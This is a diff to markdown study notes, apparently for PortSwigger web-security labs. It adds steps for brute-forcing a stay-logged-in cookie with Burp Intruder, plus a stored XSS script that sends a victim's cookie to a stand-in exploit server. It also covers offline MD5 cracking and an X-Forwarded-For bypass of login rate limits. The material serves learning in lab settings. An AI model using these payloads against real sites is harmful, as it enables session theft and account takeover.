@@ -871,18 +871,32 @@ Sec-Ch-Ua-Platform: "Linux"
 
 >Intruder Payload processing, add GREP option and the following rules in sequential order before attack is submitted.  
   
-1. Hash: MD5  
-2. Add prefix: carlos:  
-3. Encode: Base64-encode.  
+1. Logout as current user.  
+2. Send the most recent GET /my-account request to Burp Intruder.  
+3. Select the cookie: ```stay-logged-in``` as injection position.  
+4. Hash: ```MD5```  
+5. Add prefix: ```carlos:```  
+6. Encode: ```Base64-encode```  
+7. Add **GREP** under settings tab, to check for the string in the response ```Update email``` indicating successfully logged in attack.  
   
-```bash
-grep 'Update email'
-```  
-
 ![brute](images/brute.png)  
 
 [PortSwigger Lab: Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)  
   
+### Stay-logged-in Offline Crack  
+  
+>The blog application comment function is vulnerable to stored XSS, use the below to send the Carlos session cookie value to exploit server.  
+
+```
+<script>
+document.location='https://EXPLOIT.net/StealCookie='+document.cookie
+</script>
+```  
+  
+>Base64 decode the ```stay-logged-in``` cookie value and use online **MD5** hash crack station database.  
+
+[PortSwigger Lab: Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)  
+
 ### Brute Force Protected Login  
 
 >***Identified*** brute force protection on login when back-end enforce 30 minute ban, resulting in **IP blocked** after too many invalid login attempts. Testing ```X-Forwarded-For:``` header result in bypass of brute force protection. Observing the response time with long invalid password, mean we can use **Pitchfork** technique to identify first valid usernames with random long password and then rerun intruder with **Pitchfork**, set each payload position attack iterates through all sets simultaneously.  
